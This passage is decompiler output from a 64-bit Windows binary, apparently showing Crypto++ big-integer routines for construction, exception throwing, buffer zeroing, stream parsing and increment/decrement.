  char Dst; // [rsp+80h] [rbp-38h]
  __int64 v15; // [rsp+90h] [rbp-28h]
  __int64 v16; // [rsp+98h] [rbp-20h]

  v2 = a1;
  sub_140023410(a1, a2);
  *v2 = &off_1400A6600;
  v3 = v2[5];
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(v3);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  v2[18] = &off_1400A9910;
  v4 = sub_14004B580(v3);
  v2[20] = v4;
  sub_140025670(v4);
  if ( v4 )
    v5 = sub_14003A000(8 * v4);
  else
    v5 = 0i64;
  v2[21] = v5;
  *((_DWORD *)v2 + 44) = 0;
  *v5 = 0i64;
  if ( v2[20] != 1i64 )
    memset((void *)(v2[21] + 8i64), 0, 8 * (v2[20] - 1i64));
  v6 = 5i64 * v2[5];
  v2[24] = v6;
  sub_140025670(v6);
  if ( v6 )
    v7 = sub_14003A000(8 * v6);
  else
    v7 = 0i64;
  v2[25] = v7;
  if ( !v2[5] || !(*(_BYTE *)v2[6] & 1) )
  {
    v11 = 15i64;
    v10 = 0i64;
    v9 = 0;
    sub_140004F20(&v9, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v12);
    v12 = &off_1400A8798;
    v13 = 1;
    v16 = 15i64;
    v15 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v9, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v12 = &off_1400A8798;
    CxxThrowException(&v12, &_TI3_AVcls_001_CryptoPP__);
  }
  sub_14004AC00(v2[21], (__m128i *)v2[25], (_QWORD *)v2[6], v2[5]);
  return v2;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A6600: using guessed type __int64 (__fastcall *off_1400A6600)(void *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003BC90) ----------------------------------------------------
__int64 __fastcall sub_14003BC90(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  __int64 v5; // rsi
  __int64 v6; // rax
  char v8; // [rsp+20h] [rbp-68h]
  __int64 v9; // [rsp+28h] [rbp-60h]
  __int64 v10; // [rsp+30h] [rbp-58h]
  unsigned __int64 v11; // [rsp+40h] [rbp-48h]
  void *Memory; // [rsp+48h] [rbp-40h]
  __int64 v13; // [rsp+50h] [rbp-38h]
  char v14; // [rsp+58h] [rbp-30h]
  void (__fastcall ***v15)(_QWORD, signed __int64); // [rsp+60h] [rbp-28h]

  v13 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  sub_140036DA0(a1, 0);
  *(_DWORD *)(v5 + 24) = -1;
  *(_BYTE *)(v5 + 32) = 0;
  *(_QWORD *)v5 = &off_1400A9930;
  *(_QWORD *)(v5 + 8) = off_1400A9A98;
  v11 = 0i64;
  Memory = 0i64;
  v9 = v4;
  v10 = v3;
  v8 = 0;
  v6 = sub_140036C20((__int64)&v14, (__int64)"InputBuffer", (__int64)&v8, 1);
  sub_14005B030((_QWORD *)v5, v6);
  if ( v15 )
    (**v15)(v15, 1i64);
  memset(Memory, 0, v11);
  free(Memory);
  return v5;
}
// 1400A9930: using guessed type __int64 (__fastcall *off_1400A9930)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (000000014003BD50) ----------------------------------------------------
_DWORD *__fastcall sub_14003BD50(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 1;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (000000014003BE30) ----------------------------------------------------
__int64 __fastcall sub_14003BE30(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rbx
  signed __int64 v5; // rdi
  _QWORD *v6; // rax

  v3 = a2;
  v4 = a1;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *(_QWORD *)v4 = &off_1400A9910;
  v5 = sub_14004B580(a3);
  *(_QWORD *)(v4 + 16) = v5;
  sub_140025670(v5);
  if ( v5 )
    v6 = sub_14003A000(8 * v5);
  else
    v6 = 0i64;
  *(_QWORD *)(v4 + 24) = v6;
  *(_DWORD *)(v4 + 32) = 0;
  *v6 = v3;
  if ( *(_QWORD *)(v4 + 16) != 1i64 )
    memset((void *)(*(_QWORD *)(v4 + 24) + 8i64), 0, 8 * (*(_QWORD *)(v4 + 16) - 1i64));
  return v4;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003BED0) ----------------------------------------------------
_QWORD *__fastcall sub_14003BED0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, char a5, __int64 a6, __int64 a7)
{
  _QWORD *v7; // rbx
  __int64 v8; // rcx
  __int64 v9; // r10
  char v11; // [rsp+50h] [rbp-58h]

  v7 = a1;
  v8 = a6;
  v9 = a7;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a6);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *v7 = &off_1400A9910;
  v7[2] = 0i64;
  v7[3] = 0i64;
  if ( !(unsigned __int8)sub_14004AB20((__int64)v7, a2, a3, a4, a5, v8, v9) )
  {
    sub_14003C300(&v11);
    CxxThrowException(&v11, &_TI3_AVcls_098_cls_097_CryptoPP__);
  }
  return v7;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400D4150: using guessed type int _TI3_AVcls_098_cls_097_CryptoPP__;
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003BFA0) ----------------------------------------------------
_QWORD *__fastcall sub_14003BFA0(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *v2 = &off_1400A9910;
  v2[2] = 0i64;
  v2[3] = 0i64;
  sub_14003E8A0((__int64)v2, a2);
  return v2;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003C000) ----------------------------------------------------
__int64 __fastcall sub_14003C000(__int64 a1, __int64 a2)
{
  __int64 v2; // rsi
  __int64 v3; // rbx
  __int64 v4; // rax
  _QWORD *v5; // rcx
  signed __int64 v6; // rdi
  void *v7; // rax
  const void *v8; // r8
  void *v9; // rcx

  v2 = a2;
  v3 = a1;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *(_QWORD *)v3 = &off_1400A9910;
  v4 = *(_QWORD *)(a2 + 16);
  if ( v4 )
  {
    v5 = (_QWORD *)(*(_QWORD *)(a2 + 24) + 8 * v4 - 8);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = sub_14004B580((unsigned int)v4);
  *(_QWORD *)(v3 + 16) = v6;
  sub_140025670(v6);
  if ( v6 )
    v7 = sub_14003A000(8 * v6);
  else
    v7 = 0i64;
  *(_QWORD *)(v3 + 24) = v7;
  *(_DWORD *)(v3 + 32) = *(_DWORD *)(v2 + 32);
  v8 = *(const void **)(v2 + 24);
  v9 = *(void **)(v3 + 24);
  if ( v9 != v8 )
    memcpy_s(v9, 8i64 * *(_QWORD *)(v3 + 16), v8, 8i64 * *(_QWORD *)(v3 + 16));
  return v3;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003C0E0) ----------------------------------------------------
__int64 __fastcall sub_14003C0E0(__int64 a1, int a2)
{
  int v2; // edi
  __int64 v3; // rbx

  v2 = a2;
  v3 = a1;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *(_QWORD *)v3 = &off_1400A9910;
  *(_QWORD *)(v3 + 16) = 2i64;
  *(_QWORD *)(v3 + 24) = sub_14003A000(0x10ui64);
  if ( v2 < 0 )
  {
    *(_DWORD *)(v3 + 32) = 1;
    v2 = -v2;
  }
  else
  {
    *(_DWORD *)(v3 + 32) = 0;
  }
  **(_QWORD **)(v3 + 24) = v2;
  *(_QWORD *)(*(_QWORD *)(v3 + 24) + 8i64) = 0i64;
  return v3;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003C170) ----------------------------------------------------
_QWORD *__fastcall sub_14003C170(_QWORD *a1, __int64 a2, __int64 a3, int a4)
{
  int v4; // esi
  unsigned __int64 v5; // rdi
  _QWORD *v6; // rbx
  char v8; // [rsp+30h] [rbp-68h]

  v4 = a4;
  v5 = a3;
  v6 = a1;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *v6 = &off_1400A9910;
  v6[2] = 0i64;
  v6[3] = 0i64;
  sub_14003BC90((__int64)&v8, a2, a3);
  sub_140045CD0((__int64)v6, (__int64)&v8, v5, v4);
  return v6;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003C210) ----------------------------------------------------
void __fastcall sub_14003C210(void *a1)
{
  _QWORD *v1; // rbx

  v1 = a1;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *v1 = &off_1400A9910;
  v1[2] = 2i64;
  v1[3] = sub_14003A000(0x10ui64);
  *((_DWORD *)v1 + 8) = 0;
  *(_QWORD *)(v1[3] + 8i64) = 0i64;
  *(_QWORD *)v1[3] = 0i64;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003C280) ----------------------------------------------------
std::exception *__fastcall sub_14003C280(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (000000014003C300) ----------------------------------------------------
_DWORD *__fastcall sub_14003C300(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 6;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (000000014003C3D0) ----------------------------------------------------
std::exception *__fastcall sub_14003C3D0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (000000014003C450) ----------------------------------------------------
_DWORD *__fastcall sub_14003C450(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 6;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (000000014003C520) ----------------------------------------------------
void __fastcall sub_14003C520(__int64 a1)
{
  void *v1; // rdx

  v1 = *(void **)(a1 + 48);
  memset(v1, 0, 8i64 * *(_QWORD *)(a1 + 40));
  free(v1);
}

//----- (000000014003C550) ----------------------------------------------------
void __fastcall sub_14003C550(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void *v3; // rdx

  v1 = a1;
  v2 = *(void **)(a1 + 88);
  memset(*(void **)(a1 + 88), 0, 8i64 * *(_QWORD *)(a1 + 80));
  free(v2);
  v3 = *(void **)(v1 + 48);
  memset(*(void **)(v1 + 48), 0, 8i64 * *(_QWORD *)(v1 + 40));
  free(v3);
}

//----- (000000014003C5B0) ----------------------------------------------------
__int64 __fastcall sub_14003C5B0(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  __int64 result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 80);
  v2 = *(_QWORD *)(a1 + 72);
  if ( v1 == (_DWORD *)a1 )
  {
    *(_BYTE *)(a1 + 65) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (000000014003C5E0) ----------------------------------------------------
__int64 __fastcall sub_14003C5E0(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  signed __int64 v3; // rcx
  __int64 result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 96);
  v2 = *(_QWORD *)(a1 + 88);
  v3 = a1 + 16;
  if ( v1 == (_DWORD *)v3 )
  {
    *(_BYTE *)(v3 + 65) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (000000014003C630) ----------------------------------------------------
signed __int64 __fastcall sub_14003C630(__int64 a1)
{
  signed __int64 v1; // rax
  __int64 v2; // rdx
  _DWORD *v3; // rdi
  __int64 v4; // rcx
  _DWORD *v5; // rdi
  __int64 v6; // rcx
  signed __int64 result; // rax

  v1 = a1 + 104;
  v2 = a1;
  v3 = *(_DWORD **)(a1 + 184);
  v4 = *(_QWORD *)(a1 + 176);
  if ( v3 == (_DWORD *)v1 )
  {
    *(_BYTE *)(v1 + 65) = 0;
    while ( v4 )
    {
      *v3 = 0;
      ++v3;
      --v4;
    }
  }
  v5 = *(_DWORD **)(v2 + 96);
  v6 = *(_QWORD *)(v2 + 88);
  result = v2 + 16;
  if ( v5 == (_DWORD *)(v2 + 16) )
  {
    *(_BYTE *)(v2 + 81) = 0;
    result = 0i64;
    while ( v6 )
    {
      *v5 = 0;
      ++v5;
      --v6;
    }
  }
  return result;
}

//----- (000000014003C670) ----------------------------------------------------
__int64 __fastcall sub_14003C670(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  unsigned __int64 v4; // r9
  _QWORD *v5; // rax
  signed __int64 v6; // rax
  const void *v7; // r8
  void *v8; // rcx

  v2 = a2;
  v3 = a1;
  if ( a1 != a2 )
  {
    v4 = *(_QWORD *)(a2 + 16);
    if ( *(_QWORD *)(a1 + 16) != v4 || !*(_QWORD *)(*(_QWORD *)(a2 + 24) + 8 * (v4 >> 1)) )
    {
      if ( v4 )
      {
        v5 = (_QWORD *)(*(_QWORD *)(a2 + 24) + 8 * v4 - 8);
        do
        {
          if ( *v5 )
            break;
          --v5;
          --v4;
        }
        while ( v4 );
      }
      v6 = sub_14004B580((unsigned int)v4);
      sub_140049D90(v3 + 8, v6);
    }
    v7 = *(const void **)(v2 + 24);
    v8 = *(void **)(v3 + 24);
    if ( v8 != v7 )
      memcpy_s(v8, 8i64 * *(_QWORD *)(v3 + 16), v7, 8i64 * *(_QWORD *)(v3 + 16));
    *(_DWORD *)(v3 + 32) = *(_DWORD *)(v2 + 32);
  }
  return v3;
}

//----- (000000014003C710) ----------------------------------------------------
_QWORD *__fastcall sub_14003C710(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // r12
  unsigned int v3; // er15
  rsize_t v4; // rbp
  _BYTE *v5; // rsi
  __int64 v6; // r13
  rsize_t v7; // rbx
  void *v8; // r14
  __int64 v9; // rcx
  signed __int64 v10; // r14
  void *v11; // rax
  void *v12; // rbx
  __int64 *v13; // rax
  __int64 *v14; // rdi
  __int64 v15; // rdx
  __int64 v16; // rax
  _QWORD *v17; // rax
  signed __int64 v18; // rax
  const void *v19; // r8
  void *v20; // rdx
  unsigned __int8 v22; // [rsp+20h] [rbp-B8h]
  __int64 v23; // [rsp+28h] [rbp-B0h]
  __int64 (__fastcall **v24)(void *); // [rsp+30h] [rbp-A8h]
  char v25; // [rsp+38h] [rbp-A0h]
  __int64 v26; // [rsp+40h] [rbp-98h]
  void *v27; // [rsp+48h] [rbp-90h]
  int v28; // [rsp+50h] [rbp-88h]
  __int64 v29; // [rsp+60h] [rbp-78h]
  _BYTE *v30; // [rsp+68h] [rbp-70h]
  __int64 v31; // [rsp+70h] [rbp-68h]
  char v32; // [rsp+78h] [rbp-60h]
  __int64 v33; // [rsp+88h] [rbp-50h]
  void *Memory; // [rsp+90h] [rbp-48h]

  v31 = -2i64;
  v23 = a2;
  v2 = a1;
  v3 = 0;
  v4 = 16i64;
  v29 = 16i64;
  sub_140045810(0x10ui64);
  v5 = sub_14003A000(0x10ui64);
  v30 = v5;
  std::ws(v2);
  v6 = 0i64;
  do
  {
    std::basic_istream<char,std::char_traits<char>>::read(v2, &v22, 1i64);
    v5[v6] = v22;
    v6 = ++v3;
    if ( v3 >= v4 )
    {
      v7 = v3 + 16;
      if ( v7 > v4 )
      {
        if ( v4 != v7 )
        {
          sub_140045810((unsigned int)v7);
          if ( v3 == -16 )
            v8 = 0i64;
          else
            v8 = sub_14003A000(v3 + 16);
          if ( v5 && v8 )
            memcpy_s(v8, v4, v5, v4);
          memset(v5, 0, v4);
          free(v5);
          v5 = v8;
        }
        v30 = v5;
        v4 = v3 + 16;
        v29 = v3 + 16;
      }
    }
    v9 = *(signed int *)(*v2 + 4i64);
  }
  while ( !(*((_BYTE *)v2 + v9 + 16) & 6)
       && (v22 == 45
        || v22 == 120
        || (char)v22 >= 48 && (char)v22 <= 57
        || (char)v22 >= 97 && (char)v22 <= 102
        || (char)v22 >= 65 && (char)v22 <= 70
        || v22 == 104
        || v22 == 72
        || v22 == 111
        || v22 == 79
        || v22 == 44
        || v22 == 46) );
  if ( v2[1] )
    std::basic_istream<char,std::char_traits<char>>::putback(v2, v22);
  v5[v3 - 1] = 0;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(v9);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  v24 = &off_1400A9910;
  v10 = 2i64;
  v26 = 2i64;
  v11 = sub_14003A000(0x10ui64);
  v12 = v11;
  v27 = v11;
  v28 = 0;
  v13 = (__int64 *)sub_14003B1F0((__int64)&v32, (__int64 (__fastcall **)(void *))v5);
  v14 = v13;
  if ( &v24 != (__int64 (__fastcall ***)(void *))v13 )
  {
    v15 = v13[2];
    if ( v15 != 2 || !*(_QWORD *)(v13[3] + 8) )
    {
      v16 = v13[3];
      if ( v15 )
      {
        v17 = (_QWORD *)(v16 + 8 * v15 - 8);
        do
        {
          if ( *v17 )
            break;
          --v17;
          --v15;
        }
        while ( v15 );
      }
      v18 = sub_14004B580((unsigned int)v15);
      sub_140049D90((__int64)&v25, v18);
      v12 = v27;
      v10 = v26;
    }
    v19 = (const void *)v14[3];
    if ( v12 != v19 )
      memcpy_s(v12, 8 * v10, v19, 8 * v10);
    v28 = *((_DWORD *)v14 + 8);
  }
  v20 = Memory;
  memset(Memory, 0, 8 * v33);
  free(v20);
  sub_14003C670(v23, (__int64)&v24);
  memset(v12, 0, 8 * v10);
  free(v12);
  memset(v5, 0, v4);
  free(v5);
  return v2;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A1500: using guessed type __int64 __fastcall std::ws(_QWORD);
// 1400A1508: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::putback(_QWORD, _QWORD);
// 1400A1510: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::read(_QWORD, _QWORD, _QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003CA00) ----------------------------------------------------
__int64 __fastcall sub_14003CA00(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rax
  void *v7; // rdx
  char v9; // [rsp+30h] [rbp-38h]
  __int64 v10; // [rsp+40h] [rbp-28h]
  void *Memory; // [rsp+48h] [rbp-20h]

  v3 = a3;
  v4 = a2;
  v5 = sub_14003C000((__int64)&v9, a1);
  v6 = sub_14003D660(v5, v3);
  sub_14003C000(v4, v6);
  v7 = Memory;
  memset(Memory, 0, 8 * v10);
  free(v7);
  return v4;
}

//----- (000000014003CDA0) ----------------------------------------------------
char __fastcall sub_14003CDA0(__int64 a1)
{
  _QWORD *v1; // rdx
  __int64 v2; // rax
  _QWORD *v3; // rcx
  char result; // al

  if ( *(_DWORD *)(a1 + 32) == 1 )
    goto LABEL_12;
  v1 = *(_QWORD **)(a1 + 24);
  if ( *v1 )
    goto LABEL_12;
  v2 = *(_QWORD *)(a1 + 16);
  if ( v2 )
  {
    v3 = &v1[v2 - 1];
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v2;
    }
    while ( v2 );
  }
  if ( (_DWORD)v2 )
LABEL_12:
    result = 0;
  else
    result = 1;
  return result;
}

//----- (000000014003CDE0) ----------------------------------------------------
__int64 __fastcall sub_14003CDE0(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int64 *v2; // r8
  unsigned __int64 v3; // r9
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rax
  unsigned int v6; // ecx
  signed __int64 v7; // rax
  bool v8; // zf
  unsigned __int64 *v10; // r9
  unsigned __int64 v11; // r8
  unsigned __int64 v12; // rcx
  unsigned __int64 v13; // rax
  unsigned int v14; // edi
  signed __int64 v15; // rdx
  unsigned __int64 v16; // rcx
  __int64 v17; // rax
  _QWORD *v18; // rcx
  __int64 v19; // rax
  char v20; // [rsp+30h] [rbp+8h]

  v1 = a1;
  if ( *(_DWORD *)(a1 + 32) == 1 )
  {
    v10 = *(unsigned __int64 **)(a1 + 24);
    v11 = *(_QWORD *)(a1 + 16);
    v12 = *v10;
    v13 = *v10 - 1;
    *v10 = v13;
    if ( v13 > v12 )
    {
      v14 = 1;
      if ( v11 > 1 )
      {
        v15 = 1i64;
        do
        {
          v16 = v10[v15];
          v10[v15] = v16 - 1;
          if ( v16 )
            break;
          v15 = ++v14;
        }
        while ( v14 < v11 );
      }
    }
    v17 = *(_QWORD *)(v1 + 16);
    if ( v17 )
    {
      v18 = (_QWORD *)(*(_QWORD *)(v1 + 24) + 8 * v17 - 8);
      do
      {
        if ( *v18 )
          break;
        --v18;
        --v17;
      }
      while ( v17 );
    }
    if ( !(_DWORD)v17 )
    {
      v19 = sub_14004B4E0(&v20);
      sub_14003C670(v1, v19);
    }
  }
  else
  {
    v2 = *(unsigned __int64 **)(a1 + 24);
    v3 = *(_QWORD *)(a1 + 16);
    v4 = *v2;
    v5 = *v2 + 1;
    *v2 = v5;
    if ( v5 < v4 )
    {
      v6 = 1;
      if ( v3 <= 1 )
      {
LABEL_7:
        sub_1400458E0(v1 + 8, 2i64 * *(_QWORD *)(v1 + 16));
        *(_QWORD *)(*(_QWORD *)(v1 + 24) + 8i64 * (*(_QWORD *)(v1 + 16) >> 1)) = 1i64;
        return v1;
      }
      v7 = 1i64;
      while ( 1 )
      {
        v8 = v2[v7]++ == -1i64;
        if ( !v8 )
          break;
        v7 = ++v6;
        if ( v6 >= v3 )
          goto LABEL_7;
      }
    }
  }
  return v1;
}
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);

//----- (000000014003CF00) ----------------------------------------------------
__int64 __fastcall sub_14003CF00(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int64 v2; // r9
  unsigned __int64 *v3; // r8
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rax
  unsigned int v6; // ecx
  signed __int64 v7; // rax
  bool v8; // zf
  unsigned __int64 v9; // rcx
  unsigned __int64 v10; // rax
  unsigned int v11; // edi
  signed __int64 v12; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rax
  __int64 v15; // rax
  void *v16; // rdx
  char v18; // [rsp+28h] [rbp-30h]
  __int64 v19; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]
